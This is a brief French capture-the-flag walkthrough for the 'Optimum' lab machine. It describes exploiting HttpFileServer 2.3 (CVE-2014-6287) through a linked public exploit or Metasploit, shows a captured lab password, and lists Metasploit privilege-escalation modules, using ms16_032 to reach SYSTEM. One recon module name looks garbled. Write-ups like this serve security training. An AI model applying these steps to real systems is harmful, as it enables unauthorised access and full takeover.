# Optimum

le scan nmap affiche le port 80
l'application est HttpFileServer 2.3

Une vulnérabilité est displonible :
	https://github.com/thepedroalves/HFS-2.3-RCE-Exploit/blob/main/exploit.py

ou alors passer par
	msfconsole

la vulnérabilité exploit la CVE-2014-6287

l'application est lancé par l'utilisateur kostas on obtient alors le fichier user.txt




Pour l'élévation de privilege il faut utiliser le script winepeas

BONUS récupréation du mot de passe utilisateur kostas : 
	grace a winpeas : kdeEjDowkS*


Pour l'élévation de privilège on va utilisé sur metasploit :
	 use post/multi/recon/rejetto_hfs_exec

		 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
		 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
		 3   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
		 4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
		 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
		 6   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable

Pour l'élévation de privilège il faudra utiliser le 5
Préciser la session, et le LHOST. puis run
on a alors une nouvelle sessions en tant que SYTEME


